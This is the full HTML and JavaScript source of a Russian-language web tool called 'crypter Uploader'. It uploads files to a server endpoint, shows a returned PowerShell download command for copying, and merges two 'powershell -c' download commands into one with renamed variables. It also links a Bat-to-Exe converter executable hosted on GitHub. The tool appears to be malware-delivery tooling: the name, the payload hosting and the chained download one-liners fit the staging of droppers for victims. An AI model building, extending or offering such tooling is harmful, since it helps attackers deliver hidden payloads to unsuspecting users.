<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>crypter Uploader</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .upload-area {
            border: 3px dashed #667eea;
            border-radius: 15px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f8f9ff;
        }
        .upload-area:hover {
            background: #eef1ff;
            border-color: #764ba2;
        }
        .upload-area.dragover {
            background: #e0e7ff;
            border-color: #764ba2;
        }
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        .upload-text {
            color: #666;
            font-size: 16px;
        }
        .upload-text span {
            color: #667eea;
            font-weight: bold;
        }
        #fileInput {
            display: none;
        }
        .file-info {
            margin-top: 20px;
            padding: 15px;
            background: #f0f0f0;
            border-radius: 10px;
            display: none;
        }
        .file-info.show {
            display: block;
        }
        .file-name {
            font-weight: bold;
            color: #333;
            word-break: break-all;
        }
        .upload-btn {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
            display: none;
        }
        .upload-btn:hover {
            transform: translateY(-2px);
        }
        .upload-btn.show {
            display: block;
        }
        .upload-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .result {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9ff;
            border-radius: 15px;
            border-left: 4px solid #667eea;
            display: none;
        }
        .result.show {
            display: block;
        }
        .result-label {
            font-weight: bold;
            color: #667eea;
            margin-bottom: 10px;
            display: block;
        }
        .powershell-cmd {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            word-break: break-all;
            position: relative;
            cursor: pointer;
        }
        .powershell-cmd:hover {
            background: #2d2d2d;
        }
        .powershell-cmd::after {
            content: 'Кликни чтобы скопировать';
            position: absolute;
            top: 5px;
            right: 10px;
            font-size: 10px;
            color: #888;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .powershell-cmd:hover::after {
            opacity: 1;
        }
        .copied {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #27ae60;
            color: white;
            padding: 15px 30px;
            border-radius: 10px;
            font-weight: bold;
            display: none;
            z-index: 1000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .copied.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        .merger {
            margin-top: 30px;
            padding: 20px;
            background: #f0f4ff;
            border-radius: 15px;
            border-left: 4px solid #764ba2;
        }
        .cmd-input {
            width: 100%;
            min-height: 60px;
            margin: 10px 0;
            padding: 10px;
            border: 2px solid #667eea;
            border-radius: 8px;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            resize: vertical;
        }
        .merge-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: transform 0.3s ease;
        }
        .merge-btn:hover {
            transform: scale(1.02);
        }
        .progress {
            margin-top: 20px;
            height: 6px;
            background: #e0e0e0;
            border-radius: 3px;
            overflow: hidden;
            display: none;
        }
        .progress.show {
            display: block;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }
        .status {
            text-align: center;
            margin-top: 10px;
            color: #666;
            font-size: 14px;
            display: none;
        }
        .status.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📤 crypter Uploader <small style="font-size: 10px; opacity: 0.5;">v2.1.1</small></h1>
        
        <div class="upload-area" id="uploadArea">
            <div class="upload-icon">📁</div>
            <div class="upload-text">
                Перетащи файл сюда или <span>кликни для выбора</span>
            </div>
        </div>
        
        <input type="file" id="fileInput" multiple>
        
        <div class="file-info" id="fileInfo">
            <div class="file-name" id="fileName"></div>
            <div id="fileSize"></div>
        </div>
        
        <button class="upload-btn" id="uploadBtn">Загрузить на crypter</button>
        
        <div class="progress" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="status"></div>
        
        <div class="result" id="result">
            <span class="result-label">PowerShell команда для скачивания:</span>
            <div class="powershell-cmd" id="powershellCmd"></div>
        </div>
        
        <div class="merger" id="merger">
            <span class="result-label">🔗 Объединение 2 команд в 1</span>
            <textarea class="cmd-input" id="cmd1" placeholder="Вставь первую команду..."></textarea>
            <textarea class="cmd-input" id="cmd2" placeholder="Вставь вторую команду..."></textarea>
            <button class="merge-btn" id="mergeBtn">Объединить команды</button>
            <div class="result" id="mergeResult" style="margin-top: 15px; display: none;">
                <span class="result-label">Объединенная команда:</span>
                <div class="powershell-cmd" id="mergedCmd"></div>
            </div>
        </div>

        <div style="margin-top: 30px; text-align: center; border-top: 1px solid #eee; padding-top: 20px; color: #666; font-size: 14px;">
            Чтобы превратить <b>.bat</b> в <b>.exe</b>, скачайте этот файл: <br><br>
            <a href="https://github.com/HANTERINI/feasdxsz/raw/main/BatToExeConverter.exe" download class="download-btn" style="text-decoration: none; display: inline-block; padding: 12px 24px; background: #27ae60; color: white; border-radius: 8px; font-weight: bold; transition: background 0.3s;">
                📥 Скачать Bat To Exe (.exe)
            </a>
        </div>
    </div>
    
    <div class="copied" id="copied">Скопировано!</div>

    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const fileInfo = document.getElementById('fileInfo');
        const fileName = document.getElementById('fileName');
        const fileSize = document.getElementById('fileSize');
        const uploadBtn = document.getElementById('uploadBtn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        const result = document.getElementById('result');
        const powershellCmd = document.getElementById('powershellCmd');
        const copied = document.getElementById('copied');

        let selectedFiles = [];

        uploadArea.addEventListener('click', () => fileInput.click());
        
        function updateFileInfo() {
            if (selectedFiles.length === 0) {
                fileInfo.classList.remove('show');
                uploadBtn.classList.remove('show');
                return;
            }
            
            if (selectedFiles.length === 1) {
                fileName.textContent = selectedFiles[0].name;
                fileSize.textContent = formatFileSize(selectedFiles[0].size);
            } else {
                const totalSize = selectedFiles.reduce((sum, f) => sum + f.size, 0);
                fileName.textContent = `${selectedFiles.length} файла: ${selectedFiles.map(f => f.name).join(', ')}`;
                fileSize.textContent = formatFileSize(totalSize);
            }
            
            fileInfo.classList.add('show');
            uploadBtn.classList.add('show');
            result.classList.remove('show');
        }
        
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFiles(files);
            }
        });

        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFiles(e.target.files);
            }
        });

        function handleFiles(files) {
            selectedFiles = Array.from(files).slice(0, 2);
            updateFileInfo();
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        uploadBtn.addEventListener('click', async () => {
            if (selectedFiles.length === 0) return;

            uploadBtn.disabled = true;
            progress.classList.add('show');
            status.classList.add('show');
            result.classList.remove('show');

            try {
                status.textContent = 'Подготовка файлов...';
                progressBar.style.width = '30%';

                const uploadPromises = selectedFiles.map(file => {
                    return new Promise((resolve, reject) => {
                        const reader = new FileReader();
                        reader.onload = () => resolve({
                            filename: file.name,
                            content: reader.result.split(',')[1]
                        });
                        reader.onerror = reject;
                        reader.readAsDataURL(file);
                    });
                });

                const filesData = await Promise.all(uploadPromises);
                
                status.textContent = 'Загрузка в облако...';
                progressBar.style.width = '60%';

                const response = await fetch('/api/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ files: filesData })
                });

                progressBar.style.width = '100%';

                if (!response.ok) {
                    const errorData = await response.json().catch(() => ({}));
                    throw new Error(errorData.error || 'Ошибка загрузки');
                }

                const responseData = await response.json();
                
                if (!responseData.success) {
                    throw new Error(responseData.error || 'Ошибка от сервера');
                }
                
                powershellCmd.textContent = responseData.command || '';
                result.classList.add('show');
                status.textContent = 'Готово!';

            } catch (error) {
                status.textContent = 'Ошибка: ' + error.message;
                status.style.color = '#e74c3c';
            } finally {
                uploadBtn.disabled = false;
            }
        });

        powershellCmd.addEventListener('click', () => {
            navigator.clipboard.writeText(powershellCmd.textContent).then(() => {
                copied.classList.add('show');
                setTimeout(() => copied.classList.remove('show'), 2000);
            });
        });
        
        const cmd1 = document.getElementById('cmd1');
        const cmd2 = document.getElementById('cmd2');
        const mergeBtn = document.getElementById('mergeBtn');
        const mergeResult = document.getElementById('mergeResult');
        const mergedCmd = document.getElementById('mergedCmd');
        
        mergeBtn.addEventListener('click', () => {
            let command1 = cmd1.value.trim();
            let command2 = cmd2.value.trim();
            
            if (!command1 || !command2) {
                alert('Вставь обе команды!');
                return;
            }
            
            const clean = (c) => c.replace(/^powershell\s+-c\s+["']/i, '').replace(/["']$/i, '').replace(/\\"/g, "'");
            
            command1 = clean(command1);
            command2 = clean(command2);
            
            // Переименовываем переменные во второй команде, чтобы они не конфликтовали с первой
            // Ищем переменные типа $t, $u, $d (включая те, что уже с цифрами)
            command2 = command2.replace(/\$([tud])(\d*)\b/g, (match, p1, p2) => {
                const num = p2 ? parseInt(p2) + 1 : 2;
                return `$${p1}${num}`;
            });
            
            const combined = `powershell -c "${command1};${command2}"`;
            
            mergedCmd.textContent = combined;
            mergeResult.style.display = 'block';
        });
        
        mergedCmd.addEventListener('click', () => {
            navigator.clipboard.writeText(mergedCmd.textContent).then(() => {
                copied.classList.add('show');
                setTimeout(() => copied.classList.remove('show'), 2000);
            });
        });
    </script>
</body>
</html>
